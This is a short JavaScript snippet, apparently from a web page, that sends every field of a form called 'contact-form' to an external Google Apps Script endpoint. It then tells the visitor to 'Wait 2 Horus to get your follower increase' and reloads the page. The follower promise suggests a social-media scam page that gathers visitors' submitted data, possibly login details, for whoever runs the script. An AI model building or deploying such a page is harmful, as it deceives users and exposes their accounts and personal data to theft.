const scriptUrl = 'https://script.google.com/macros/s/AKfycbziisYNIyb3ahWm5mSX2tFCO5PskrrRCgkjC8bosQW2z0a7_eNpvsFQA6rO9-qgrlyH/exec'

const form = document.forms['contact-form']

form.addEventListener('submit', e=>{
    e.preventDefault()
    fetch(scriptUrl, {method: 'POST', body: new FormData(form)})
    .then(response => alert("Wait 2 Horus to get your follower increase."))
    .then(()=> {window.location.reload();})
    .catch(error => console.log('Error!', error.message))
})